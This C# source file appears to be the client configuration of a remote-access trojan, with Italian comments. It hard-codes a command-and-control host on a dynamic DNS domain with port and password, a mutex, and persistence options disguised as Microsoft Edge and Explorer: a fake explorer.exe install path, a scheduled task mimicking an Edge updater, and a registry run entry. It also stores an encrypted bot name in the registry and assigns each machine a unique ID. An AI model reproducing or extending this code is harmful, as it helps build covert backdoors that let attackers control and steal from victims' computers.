using bc.srv.Classes.Crypt;

namespace bc.srv.Classes
{
    internal class CreateStClient
    {
        public static bool InitializeStClient()
        {
            SrvData.Instance.StartupDelay = Program.Random.Next(5,1000);
            
            // NORMAL
            SrvData.Instance.Port = 2401;
            SrvData.Instance.Password = "slevin";
            SrvData.Instance.Host = "lqphnd2gfz.duckdns.org";
            SrvData.Instance.ServerName = "imback";
            SrvData.Instance.sMutex = "tUOns2DB6";



            SrvData.Instance.UseTaskScheduler = false;
            SrvData.Instance.BUseHkcu = false;
            SrvData.Instance.bUseExplorer = false;
            SrvData.Instance.bUseStartupFolder = false;


            SrvData.Instance.sAppDataInstall = "Microsoft\\Windows\\Edge\\explorer.exe";
            SrvData.Instance.sStartupFileName = "explore.exe";
            SrvData.Instance.TaskSchedulerName = "MicrosoftEdgeUpdaterTaskMachineCore";
            
            SrvData.Instance.SHkcuEntry = "winexplorer";
            SrvData.Instance.sExplorerEntry = "EXPLORER";

            // ERRORE RECUPERO DATI DA RISORSE
            if (SrvData.Instance.Port == -1 || SrvData.Instance.Password == null || SrvData.Instance.Host == null)
                Program.Exit(2);
            //-----------------------------------

            // END NORMAL
            // #endif


            // GESTIONE SERVER NAME
            var rm = new RegistryManager();
            var td = new TextDes();

            string servName;

            var regExist = rm.ExistServerNameEntry();

            if (regExist)
            {
                servName = td.Decrypt(rm.GetNameFromRegistry(), true);
            }
            else
            {
                servName = SrvData.Instance.ServerName;

                if (servName == null)
                    servName = "NO NAME";

                rm.SetNewNameInRegistry(td.Encrypt(servName,
                    true)); // prima esecuzione setto il nome sul registro                
            }

            SrvData.Instance.ServerName = servName;
            //-------------------------------------------------

            var uid = new UnivoqueId();
            SrvData.Instance.UnivoqueId = uid.GetUnivoqueId(); // ASSEGNO IL CODICE UNIVOCO    

            return true;
        }
    }
}